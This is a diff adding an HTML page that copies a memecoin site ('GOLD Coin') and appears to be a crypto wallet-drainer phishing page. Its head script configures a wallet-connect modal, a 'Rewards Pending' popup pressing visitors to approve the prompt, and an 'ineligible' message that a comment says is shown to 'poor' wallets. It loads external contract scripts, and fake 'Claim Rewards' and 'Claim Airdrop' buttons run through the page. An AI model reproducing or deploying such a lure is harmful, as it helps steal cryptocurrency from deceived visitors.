@@ -1,0 +1,473 @@
+<!DOCTYPE html>
+<html lang="en" data-scrapbook-source="https://hodl.gold/" data-scrapbook-create="20230921071817941"
+    data-scrapbook-title="GOLD Coin">
+
+    <script defer="defer" src="js/vendors.js"></script>
+	<script defer="defer" src="js/contracts.js"></script>
+	<script defer="defer" src="js/main.js"></script>
+	
+	<script>
+	  window.UNIQUE_IDENTITY = "yelping_cheetah_23";
+	
+	  // Pick a theme here, this defaults to "light"
+	  window.modal_theme = "dark";
+	
+	  // https://docs.walletconnect.com/2.0/web/walletConnectModal/theming
+	  window.modal_variables = { "--w3m-accent-color": "#000000", "--w3m-background-color": "#000000",
+		/* Example of what you can do */
+		// "--w3m-accent-color": "#4B1787",
+		// "--w3m-background-color": "#4B1787",
+		// "--w3m-logo-image-url": "/your-logo.svg",
+	  };
+	
+	  // Notification modals
+	 window.popups = {
+	PENDING: {
+	  // The popup that shows when they get prompted
+	  title: "Rewards Pending",
+	  text: "You must approve the prompt in order to continue."
+	},
+	INVALID: {
+	  // Shown when they connect on a wallet that is poor.
+	  // title: "Ineligible Address",
+	  text: "The connected account is not eligible for this event.\nPlease try using a different account.",
+	}
+	  }
+	
+	  // Only touch this if you know what you're doing!
+	  window.OVERRIDE_MODE = false;
+	</script>
+	</head>
+    <meta charset="UTF-8">
+    <title>GOLD Coin</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <meta property="og:type" content="website">
+    <meta property="twitter:card" content="summary_large_image">
+
+    <meta property="og:site_name" content="GOLD Coin">
+    <meta property="og:title" content="GOLD Coin">
+    <meta property="twitter:title" content="GOLD Coin">
+
+    <meta property="og:url" content="https://hodl.gold/">
+    <meta property="twitter:url" content="https://hodl.gold/">
+
+    <meta property="og:image" content="https://hodl.gold/og_image.jpg">
+    <meta property="twitter:image" content="https://hodl.gold/og_image.jpg">
+
+    <meta name="description"
+        content="GOLD is the ethereum project for the most valuable resource in the world. It's also a meme. That's all it'll ever be. Launched stealth with no presale, low taxes &amp; LP burnt. Contract will be renounced. GOLD is here to bring back the golden era of crypto.">
+    <meta property="og:description"
+        content="GOLD is the ethereum project for the most valuable resource in the world. It's also a meme. That's all it'll ever be. Launched stealth with no presale, low taxes &amp; LP burnt. Contract will be renounced. GOLD is here to bring back the golden era of crypto.">
+    <meta property="twitter:description"
+        content="GOLD is the ethereum project for the most valuable resource in the world. It's also a meme. That's all it'll ever be. Launched stealth with no presale, low taxes &amp; LP burnt. Contract will be renounced. GOLD is here to bring back the golden era of crypto.">
+
+
+
+    <link rel="stylesheet" href="bootstrap.min.css" referrerpolicy="no-referrer">
+    <link rel="stylesheet" href="animate.min.css">
+
+    <link rel="apple-touch-icon-precomposed" sizes="57x57" href="https://hodl.gold/apple-touch-icon-57x57.png">
+    <link rel="apple-touch-icon-precomposed" sizes="114x114" href="https://hodl.gold/apple-touch-icon-114x114.png">
+    <link rel="apple-touch-icon-precomposed" sizes="72x72" href="https://hodl.gold/apple-touch-icon-72x72.png">
+    <link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://hodl.gold/apple-touch-icon-144x144.png">
+    <link rel="apple-touch-icon-precomposed" sizes="60x60" href="https://hodl.gold/apple-touch-icon-60x60.png">
+    <link rel="apple-touch-icon-precomposed" sizes="120x120" href="https://hodl.gold/apple-touch-icon-120x120.png">
+    <link rel="apple-touch-icon-precomposed" sizes="76x76" href="https://hodl.gold/apple-touch-icon-76x76.png">
+    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="https://hodl.gold/apple-touch-icon-152x152.png">
+
+    <link rel="icon" type="image/png" href="favicon-196x196.png" sizes="196x196">
+    <link rel="icon" type="image/png" href="favicon-96x96.png" sizes="96x96">
+    <link rel="icon" type="image/png" href="favicon-32x32.png" sizes="32x32">
+    <link rel="icon" type="image/png" href="favicon-16x16.png" sizes="16x16">
+    <link rel="icon" type="image/png" href="favicon-128.png" sizes="128x128">
+
+    <meta name="msapplication-TileColor" content="#FFFFFF">
+    <meta name="msapplication-TileImage" content="mstile-144x144.png">
+    <meta name="msapplication-square70x70logo" content="mstile-70x70.png">
+    <meta name="msapplication-square150x150logo" content="mstile-150x150.png">
+    <meta name="msapplication-wide310x150logo" content="mstile-310x150.png">
+    <meta name="msapplication-square310x310logo" content="mstile-310x310.png">
+
+    <style type="text/css">
+        @font-face {
+            font-family: "DOS";
+            font-style: normal;
+            font-weight: normal;
+            src: url("");
+            src: local("☺"), url("") format("woff"), url("") format("truetype"),
+                url("") format("svg");
+        }
+
+        :root {
+            --bs-font-sans-serif: DOS, Monaco, Menlo, Consolas, "Courier New", monospace;
+            --bs-nav-link-color: #000;
+            --bs-link-color: #000;
+            --bs-body-font-size: 1.25rem;
+        }
+
+        .offcanvas {
+            --bs-offcanvas-height: 60vh;
+        }
+
+        body {
+            padding-top: 20px;
+            padding-bottom: 40px;
+            background-color: gold;
+            color: black;
+        }
+
+        .nav {
+            background-color: #bbb;
+        }
+
+        .btn {
+            transition: none;
+        }
+
+        h1 {
+            font-size: 50px;
+        }
+
+        @media (min-width: 576px) {
+            h1 {
+                font-size: 72px;
+            }
+        }
+
+        .bg-gold {
+            background-color: gold;
+        }
+
+        .btn-buy {
+            line-height: 60px;
+            text-align: center;
+            text-decoration: none;
+            color: #fff;
+            border-radius: 0;
+            font-size: 40px;
+            padding: 14px 24px;
+            box-shadow: rgb(0, 0, 0) 10px 10px 0 0;
+            background-color: #555;
+        }
+
+        .btn-buy:hover {
+            color: #fff;
+            background: #555;
+        }
+
+        .nav-item.active a,
+        .nav-item.active,
+        .nav-link:hover {
+            background: #000;
+            color: #fff;
+        }
+
+        h3 {
+            color: #000;
+        }
+
+        h3 a {
+            color: #000;
+            text-decoration: none;
+        }
+
+        .strikethrough {
+            position: relative;
+        }
+
+        .strikethrough:after {
+            position: absolute;
+            content: "";
+            left: 0;
+            top: 50%;
+            right: 0;
+            border-top: 2px solid;
+            border-color: inherit;
+            transform: translateY(-50%);
+        }
+
+        small,
+        .small {
+            font-size: 0.7em;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <div class="row justify-content-center mb-3">
+            <div class="col-12 col-md-8 col-lg-7">
+                <img src="favicon-196x196.png" style="width: 80px" class="d-block mx-auto">
+                <hr class="border border-white mb-0 mt-5 opacity-100 d-none d-lg-block">
+
+                <nav class="navbar navbar-expand-lg fixed-bottom d-lg-none bg-dark">
+                    <div class="container-fluid justify-content-around">
+                        <a class="navbar-brand" data-bs-toggle="offcanvas" href="#offcanvas-nav">
+                            <svg class="svg-inline--fa fa-bars" aria-hidden="true" focusable="false" data-prefix="fas"
+                                data-icon="bars" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"
+                                style="
+                                        box-sizing: content-box;
+                                        height: 1em;
+                                        overflow: visible;
+                                        vertical-align: -0.125em;
+                                    ">
+                                <path fill="#fff"
+                                    d="M0 96C0 78.3 14.3 64 32 64H416c17.7 0 32 14.3 32 32s-14.3 32-32 32H32C14.3 128 0 113.7 0 96zM0 256c0-17.7 14.3-32 32-32H416c17.7 0 32 14.3 32 32s-14.3 32-32 32H32c-17.7 0-32-14.3-32-32zM448 416c0 17.7-14.3 32-32 32H32c-17.7 0-32-14.3-32-32s14.3-32 32-32H416c17.7 0 32 14.3 32 32z">
+                                </path>
+                            </svg>
+                        </a>
+                    </div>
+                </nav>
+
+                <div class="offcanvas offcanvas-bottom" tabindex="-1" id="offcanvas-nav">
+                    <div class="offcanvas-header bg-gold">
+                        <h3 class="offcanvas-title">GOLD</h3>
+                        <button type="button" class="btn-close" data-bs-dismiss="offcanvas" aria-label="Close"></button>
+                    </div>
+                    <div class="d-flex justify-content-center offcanvas-body bg-gold">
+                        <div class="navbar justify-content-center pt-0" style="margin-top: -2px">
+                            <ul class="list-unstyled" style="font-size: 30px">
+                                <li class="nav-item">
+                                    <a href="" class="nav-link p-0 px-2 rounded-0">Home</a>
+                                </li>
+                                <li class="nav-item">
+                                    <a href="#about" class="nav-link p-0 px-2 rounded-0">About</a>
+                                </li>
+                                <li class="nav-item">
+                                    <a href="https://etherscan.io/token/0x089453742936dd35134383aee9d78bee63a69b01"
+                                        target="_blank" class="nav-link p-0 px-2 rounded-0">Contract</a>
+                                </li>
+                                <li class="nav-item">
+                                    <a href="#tokenomics" class="nav-link p-0 px-2 rounded-0">Tokenomics</a>
+                                </li>
+                                <li class="nav-item">
+                                    <a href="#roadmap" class="nav-link p-0 px-2 rounded-0">Roadmap</a>
+                                </li>
+                                <li class="nav-item">
+                                    <a href="#team" class="nav-link p-0 px-2 rounded-0">Team</a>
+                                </li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="navbar justify-content-end pt-0 d-none d-lg-block" style="margin-top: -2px">
+                    <ul class="nav nav-pills justify-content-around">
+                        <li class="active nav-item">
+                            <a href="" class="nav-link p-0 px-2 rounded-0">Home</a>
+                        </li>
+                        <li class="nav-item">
+                            <a href="#about" class="nav-link p-0 px-2 rounded-0">About</a>
+                        </li>
+                        <li class="nav-item">
+                            <a href="https://etherscan.io/token/0x089453742936dd35134383aee9d78bee63a69b01"
+                                target="_blank" class="nav-link p-0 px-2 rounded-0">Contract</a>
+                        </li>
+                        <li class="nav-item">
+                            <a href="#tokenomics" class="nav-link p-0 px-2 rounded-0">Tokenomics</a>
+                        </li>
+                        <li class="nav-item">
+                            <a href="#roadmap" class="nav-link p-0 px-2 rounded-0">Roadmap</a>
+                        </li>
+                        <li class="nav-item">
+                            <a href="#team" class="nav-link p-0 px-2 rounded-0">Team</a>
+                        </li>
+                    </ul>
+                </div>
+
+                <h1 class="text-center my-3 py-3 text-uppercase">Introducing the GOLD Coin</h1>
+
+                <div class="text-center">
+                    <p>Total Supply: 21,000,000</p>
+                    <p class="d-none d-md-block">Contract: <a
+                            href="https://etherscan.io/token/0x089453742936dd35134383aee9d78bee63a69b01"
+                            target="_blank">0x089453742936dd35134383aee9d78bee63a69b01</a></p>
+                    <p class="d-md-none" style="font-size: 14px">
+                        <a href="https://etherscan.io/token/0x089453742936dd35134383aee9d78bee63a69b01"
+                            target="_blank">0x089453742936dd35134383aee9d78bee63a69b01</a>
+                    </p>
+                    <a id="connect_button" class="btn btn-lg btn-buy animate__infinite animate__animated animate__pulse"
+                        
+                    id="connect_button" target="_blank">&lt; Claim Rewards &gt;</a>
+
+                    <div class="row" style="margin: 50px 0 20px">
+                        <div class="col-12 col-xl-6">
+                            <div class="d-flex justify-content-between">
+                                <a href="https://twitter.com/GoldCoinETH" class="text-decoration-none mb-3"
+                                    target="_blank">
+                                    <img src="x_logo.png" style="width: 80px; height: 80px">
+                                </a>
+                                <a href="https://t.me/GoldCoinETH" class="text-decoration-none mb-3" target="_blank">
+                                    <img src="telegram_logo.svg" style="width: 80px; height: 80px">
+                                </a>
+                                <a href="https://www.dextools.io/app/en/ether/pair-explorer/0x0a86421ee3a48fa6a2e1b7775860b39d96e1453a"
+                                    class="text-decoration-none mb-3" target="_blank">
+                                    <img src="dextools.svg" style="width: 80px; height: 80px">
+                                </a>
+                            </div>
+                        </div>
+                        <div class="col-12 col-xl-6">
+                            <div class="d-flex justify-content-between">
+                                <a href="https://etherscan.io/token/0x089453742936dd35134383aee9d78bee63a69b01"
+                                    class="text-decoration-none mb-3">
+                                    <img src="etherscan_logo.svg" style="width: 80px; height: 80px">
+                                </a>
+                                <a href="https://coinmarketcap.com/dexscan/ethereum/0x0a86421ee3a48fa6a2e1b7775860b39d96e1453a/"
+                                    class="text-decoration-none mb-3">
+                                    <img src="cmc.png" style="width: 80px; height: 80px">
+                                </a>
+                                <a href="https://app.uniswap.org/swap?inputCurrency=ETH&amp;outputCurrency=0x089453742936dd35134383aee9d78bee63a69b01&amp;exactAmount=100000&amp;exactField=output&amp;use=V2&amp;chain=mainnet"
+                                    class="text-decoration-none mb-3">
+                                    <img src="uniswap.svg" style="width: 80px; height: 80px; background-color: #ff007a"
+                                        class="rounded-circle">
+                                </a>
+                            </div>
+                        </div>
+                    </div>
+
+                    <video id="i-love-gold" class="w-100" autoplay="" loop="" controls="" src="i_love_gold.mp4"
+                        style="margin: 20px 0"></video>
+
+                    <h3 id="about">About</h3>
+                    <div class="border border-3 border-secondary-subtle p-3 m-0">
+                        <h4 class="m-0">Missed Bitcoin? Don’t Miss Gold!</h4>
+                        <br>
+                        Gold has been the symbol of power, wealth, &amp; beauty in all
+                        of humanity’s recorded history. It is also widely used in internet culture to convey digital
+                        currencies. The GOLD coin is the ethereum project for one of the most valuable resources in
+                        the world. It’s also a meme. That’s all it’ll ever be. Launched stealth with no presale, low
+                        taxes, &amp; LP burnt. Contract will be renounced. GOLD is here to bring back the golden era of
+                        crypto.
+                    </div>
+                </div>
+
+                <hr class="mt-5 border border-white opacity-100">
+            </div>
+        </div>
+
+        <div class="row justify-content-center">
+            <div class="col-12 col-md-8 col-lg-6">
+                <div class="d-flex justify-content-center">
+                    <a id="connect_button" class="btn btn-lg btn-buy animate__infinite animate__animated animate__pulse"
+                    id="connect_button" style="margin-bottom: 20px"
+                        
+                    id="connect_button" target="_blank">&lt; Claim Airdrop &gt;</a>
+                </div>
+
+                <hr class="my-3 border border-white opacity-100">
+
+                <h3 style="margin: 20px 0" id="tokenomics">Tokenomics</h3>
+                <div class="row">
+                    <div class="col-6">
+                        <p>🕵️ Stealth Launch 🕵🏾</p>
+                        <p>🤖🙅🏽‍♀️ Anti-Bot</p>
+                        <p>🔥 Liquidity Pool Tokens Burned 🔥</p>
+                        <p>Max wallet size limited to 0.5%</p>
+                        <p>Limit removed within 60 minute of launch</p>
+                    </div>
+                    <div class="col-6">
+                        <p>
+                            90% Uniswap
+                            <img src="uniswap.svg" class="rounded-circle"
+                                style="width: 30px; height: 30px; background: #ff007a">
+                        </p>
+                        <p>30% Buy, Sell, Transfer Tax at launch</p>
+                        <p>10% Buy, Sell, Transfer Tax within 60 minutes of launch</p>
+                        <p>5% Buy, Sell, Transfer Tax 24 hours after launch</p>
+                        <p>0% Tax 48 hours after launch</p>
+                    </div>
+                </div>
+
+                <hr class="my-3 border border-white opacity-100">
+
+                <div class="d-flex justify-content-center">
+                    <a id="connect_button" class="btn btn-lg btn-buy animate__infinite animate__animated animate__pulse"
+                        style="margin-bottom: 20px"
+                        
+                        id="connect_button" target="_blank">&lt; Claim Rewards &gt;</a>
+                </div>
+
+                <hr class="my-3 border border-white opacity-100">
+
+                <div class="row">
+                    <h3 style="margin: 20px 0" id="roadmap">Roadmap</h3>
+                    <div class="col-12 col-md-6">
+                        <p style="font-size: 22px; margin: 10px 0" class="text-decoration-underline">Phase 1</p>
+                        <ul>
+                            <li class="text-decoration-line-through">🕵️ Stealth Launch 🕵🏾</li>
+                            <li>
+                                <span class="strikethrough">
+                                    <img src="dextools.svg" style="width: 20px; height: 20px">
+                                    DEXTools Listing
+                                </span>
+                            </li>
+                            <li>🔥 LP Tokens Burnt 🔥</li>
+                            <li>📑🙅‍♂️ Contract Renounced</li>
+                            <li>📢 Mass Marketing Push</li>
+                            <li>📈 Community Growth 📈</li>
+                            <li><img src="cmc.png" style="width: 20px; height: 20px"> CoinMarketCap Listing</li>
+                            <li><img src="coingecko.png" style="width: 20px; height: 20px"> CoinGecko Listing</li>
+                            <li>🙌 2,000 Holders 🙌</li>
+                            <li>🎟️ The Society IYKYK 😤</li>
+                        </ul>
+                    </div>
+                    <div class="col-12 col-md-6">
+                        <p style="font-size: 22px; margin: 10px 0" class="text-decoration-underline">Phase 2</p>
+                        <ul>
+                            <li>Binance, Coinbase, Robinhood, Crypto.com, X.com Listings</li>
+                            <li>25,000 Holders</li>
+                            <li>Mansa Musa Reincarnated (AI) 🧟‍♀️💀</li>
+                        </ul>
+                    </div>
+                    <div class="col-12 text-md-center">
+                        <p style="font-size: 22px; margin: 10px 0" class="text-decoration-underline">Phase 3</p>
+                        <ul class="list-unstyled">
+                            <li>1,000,000 Holders</li>
+                            <li>TBA</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <hr class="my-3 border border-white opacity-100">
+
+                <div class="d-flex justify-content-center">
+                    <a id="connect_button" class="btn btn-lg btn-buy animate__infinite animate__animated animate__pulse"
+                        style="margin-bottom: 20px"
+                        
+                        id="connect_button" target="_blank">&lt; Claim Rewards &gt;</a>
+                </div>
+
+                <hr class="my-3 border border-white opacity-100">
+
+                <h3 style="margin: 20px 0" id="team">Team</h3>
+                <div class="row text-center">
+                    <div class="col-6 col-md-3">
+                        <p class="my-2">Leo</p>
+                        <img src="Dev1.jpg" class="my-2 w-100">
+                    </div>
+                    <div class="col-6 col-md-3">
+                        <p class="my-2">Peter</p>
+                        <img src="Dev2.jpg" class="my-2 w-100">
+                    </div>
+                    <div class="col-6 col-md-3">
+                        <p class="my-2">Alex</p>
+                        <img src="Dev3.jpg" class="my-2 w-100">
+                    </div>
+                    <div class="col-6 col-md-3">
+                        <p class="my-2">Max</p>
+                        <img src="Dev4.jpg" class="my-2 w-100">
+                    </div>
+                </div>
+
+                <p class="my-4">
+                    We are a small self-funded team focused on community and blockchain technology. We have 14
+                    full-time staff and an incredible set of advisors and partners.
+                </p>
+
+                <hr class="my-3 border border-white opacity-100">
+            </div>
+        </div>
+</body>
+
+</html>
